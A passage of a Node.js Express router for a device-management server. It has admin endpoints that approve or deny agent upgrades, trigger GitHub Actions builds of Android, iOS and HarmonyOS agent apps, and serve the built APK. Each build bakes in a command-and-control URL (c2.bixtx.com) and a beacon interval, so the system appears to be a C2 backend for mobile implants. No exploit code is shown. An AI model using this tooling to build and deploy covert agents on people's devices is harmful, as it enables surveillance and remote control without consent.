  const entry = upgradeQueue.get(req.params.id);
  if (!entry) return res.status(404).json({ error: "Upgrade request not found" });
  if (entry.status !== "pending") return res.status(409).json({ error: `Request is already ${entry.status}` });

  entry.status  = "approved";
  entry.adminId = req.admin.id;
  entry.decidedAt = Date.now();

  const sent = wsHandler.sendToAgent(entry.deviceId, "UPGRADE_APPROVED", {
    requestId: entry.id,
    version:   entry.toVersion,
    approvedBy: req.admin.email,
    ts: Date.now(),
  });

  logger.info(`[Upgrades] ${entry.id} approved by ${req.admin.email}, agent notified: ${sent}`);
  res.json({ ok: true, entry, agentNotified: sent });
});

// POST /v1/upgrades/:id/deny — admin denies; forwards UPGRADE_DENIED to agent
router.post("/upgrades/:id/deny", authRequired, (req, res) => {
  const entry = upgradeQueue.get(req.params.id);
  if (!entry) return res.status(404).json({ error: "Upgrade request not found" });
  if (entry.status !== "pending") return res.status(409).json({ error: `Request is already ${entry.status}` });

  const reason = req.body?.reason || "Denied by administrator";
  entry.status    = "denied";
  entry.adminId   = req.admin.id;
  entry.decidedAt = Date.now();
  entry.denyReason = reason;

  const sent = wsHandler.sendToAgent(entry.deviceId, "UPGRADE_DENIED", {
    requestId: entry.id,
    reason,
    deniedBy: req.admin.email,
    ts: Date.now(),
  });

  logger.info(`[Upgrades] ${entry.id} denied by ${req.admin.email}: ${reason}`);
  res.json({ ok: true, entry, agentNotified: sent });
});

// ── Android APK build & download ──────────────────────────────────────────
// In-memory record of latest available APK (updated by CI webhook or local build)
let latestApk = {
  url: null,           // direct download URL (GitHub Release or local path)
  localPath: null,     // local file path if APK is stored on this server
  build: null,
  version: null,
  ts: null,
};

// POST /v1/build/android — trigger GitHub Actions workflow dispatch
// Requires GITHUB_TOKEN and GITHUB_REPO env vars
router.post("/build/android", authRequired, async (req, res) => {
  const { c2WsUrl, beaconInterval = 30 } = req.body;
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;

  if (!ghToken || !ghRepo) {
    // Return instructions for local build if CI not configured
    return res.json({
      ok: false,
      localBuild: true,
      message: "GitHub CI not configured (GITHUB_TOKEN / GITHUB_REPO not set). Build locally:",
      command: `cd software-android && ./gradlew assembleRelease -Pc2WsUrl="${c2WsUrl || "wss://c2.bixtx.com:3001"}" -PbeaconInterval=${beaconInterval}`,
      apkPath: "software-android/app/build/outputs/apk/release/app-release.apk",
    });
  }

  try {
    const r = await fetch(`https://api.github.com/repos/${ghRepo}/actions/workflows/build-apk.yml/dispatches`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${ghToken}`,
        Accept: "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        ref: "main",
        inputs: {
          c2WsUrl:        c2WsUrl || "wss://c2.bixtx.com:3001",
          beaconInterval: String(beaconInterval),
        },
      }),
    });

    if (!r.ok) {
      const body = await r.text();
      logger.error(`[Build] GitHub dispatch failed: ${r.status} ${body}`);
      return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    }

    // Poll for the latest run ID (GitHub API may take a second to register)
    logger.info(`[Build] Android APK build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "Build triggered — APK ready in ~3 min", repo: ghRepo });
  } catch (err) {
    logger.error(`[Build] Android dispatch error: ${err.message}`);
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

// GET /v1/build/android/status — latest build info
router.get("/build/android/status", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;

  const status = { ...latestApk };

  // If GitHub is configured, also fetch the latest workflow run
  if (ghToken && ghRepo) {
    try {
      const r = await fetch(
        `https://api.github.com/repos/${ghRepo}/actions/workflows/build-apk.yml/runs?per_page=1`,
        { headers: { Authorization: `Bearer ${ghToken}`, Accept: "application/vnd.github+json" } }
      );
      if (r.ok) {
        const data = await r.json();
        const run = data.workflow_runs?.[0];
        if (run) {
          status.latestRun = {
            id:         run.id,
            status:     run.status,        // queued | in_progress | completed
            conclusion: run.conclusion,    // success | failure | null
            url:        run.html_url,
            createdAt:  run.created_at,
            updatedAt:  run.updated_at,
          };
        }
      }
    } catch (_) {}
  }

  res.json(status);
});

// POST /v1/build/android/notify — called by GitHub Actions CI after successful build
router.post("/build/android/notify", (req, res) => {
  // Simple shared-secret auth (set RENDER_APK_NOTIFY_SECRET in env)
  const secret = process.env.RENDER_APK_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) {
    return res.status(401).json({ error: "Invalid secret" });
  }

  const { apkUrl, build, version } = req.body || {};
  if (!apkUrl) return res.status(400).json({ error: "apkUrl required" });

  latestApk = { url: apkUrl, localPath: null, build, version, ts: Date.now() };
  logger.info(`[Build] APK notify received: ${apkUrl} (build=${build} v${version})`);
  res.json({ ok: true });
});

// GET /v1/download/android — redirect to or proxy the latest APK
router.get("/download/android", authRequired, async (req, res) => {
  // 1. Try local file (placed by CI or manual copy)
  const fs = require("fs");
  const path = require("path");
  const localApk = path.resolve(__dirname, "../../../software-android/app/build/outputs/apk/release/app-release.apk");
  if (fs.existsSync(localApk)) {
    res.setHeader("Content-Type", "application/vnd.android.package-archive");
    res.setHeader("Content-Disposition", "attachment; filename=bixtx-agent.apk");
    return fs.createReadStream(localApk).pipe(res);
  }

  // 2. Redirect to GitHub Release URL if CI notified us
  if (latestApk.url) {
    return res.redirect(302, latestApk.url);
  }

  // 3. Try to fetch latest release from GitHub
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (ghToken && ghRepo) {
    try {
      const r = await fetch(`https://api.github.com/repos/${ghRepo}/releases/latest`, {
        headers: { Authorization: `Bearer ${ghToken}`, Accept: "application/vnd.github+json" },
      });
      if (r.ok) {
        const rel = await r.json();
        const apk = rel.assets?.find(a => a.name.endsWith(".apk"));
        if (apk) {
          return res.redirect(302, apk.browser_download_url);
        }
      }
    } catch (_) {}
  }

  res.status(404).json({
    error: "APK not built yet",
    message: "Trigger a build first via POST /v1/build/android, or run ./gradlew assembleRelease locally",
  });
});

// ── iOS / HarmonyOS build triggers ───────────────────────────────────────────
// In-memory latest build records
let latestIpa = { url: null, localPath: null, build: null, ts: null };
let latestHap = { url: null, localPath: null, build: null, ts: null };

function triggerGHWorkflow(ghToken, ghRepo, workflow, inputs) {
  return fetch(`https://api.github.com/repos/${ghRepo}/actions/workflows/${workflow}/dispatches`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${ghToken}`,
      Accept: "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ ref: "main", inputs }),
  });
}

router.post("/build/ios", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false, localBuild: true,
      message: "GitHub CI not configured. Build manually: open software-ios/ in Xcode → Product → Archive → Distribute as Enterprise.",
    });
  }
  try {
    const r = await triggerGHWorkflow(ghToken, ghRepo, "build-ios.yml", {
      c2WsUrl: req.body.c2WsUrl || C2_URL,
      beaconInterval: String(req.body.beaconInterval || BEACON),
    });
    if (!r.ok) return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    logger.info(`[Build] iOS IPA build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "iOS build triggered — IPA ready in ~10 min", repo: ghRepo });
  } catch (err) {
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.post("/build/ios/notify", (req, res) => {
  const secret = process.env.RENDER_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) return res.status(401).json({ error: "Invalid secret" });
  const { ipaUrl, build } = req.body || {};
  if (!ipaUrl) return res.status(400).json({ error: "ipaUrl required" });
  latestIpa = { url: ipaUrl, localPath: null, build, ts: Date.now() };
  logger.info(`[Build] IPA notify: ${ipaUrl}`);
  res.json({ ok: true });
});

router.get("/build/ios/status", authRequired, (req, res) => res.json(latestIpa));

router.post("/build/harmony", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false, localBuild: true,
      message: "GitHub CI not configured. Build manually: open software-harmony/ in DevEco Studio → Build → Build HAP(s).",
    });
  }
  try {
    const r = await triggerGHWorkflow(ghToken, ghRepo, "build-harmony.yml", {
      c2WsUrl: req.body.c2WsUrl || C2_URL,
    });
    if (!r.ok) return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    logger.info(`[Build] HarmonyOS HAP build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "HarmonyOS build triggered — HAP ready in ~8 min", repo: ghRepo });
  } catch (err) {
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.post("/build/harmony/notify", (req, res) => {
  const secret = process.env.RENDER_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) return res.status(401).json({ error: "Invalid secret" });
  const { hapUrl, build } = req.body || {};
  if (!hapUrl) return res.status(400).json({ error: "hapUrl required" });
  latestHap = { url: hapUrl, localPath: null, build, ts: Date.now() };
  logger.info(`[Build] HAP notify: ${hapUrl}`);
  res.json({ ok: true });
});

router.get("/build/harmony/status", authRequired, (req, res) => res.json(latestHap));

// ── GET /v1/stats ──────────────────────────────────────────────────────────
router.get("/stats", authRequired, (req, res) => {
  const devices = store.devices.getAll();
  const online = wsHandler.getOnlineDevices();
  res.json({
    devices: { total: devices.length, online: online.length, offline: devices.length - online.length },
    server: { uptime: process.uptime(), version: "4.7.2", ts: Date.now() },
  });
});

module.exports = router;
module.exports.enqueueUpgradeProposal = enqueueUpgradeProposal;
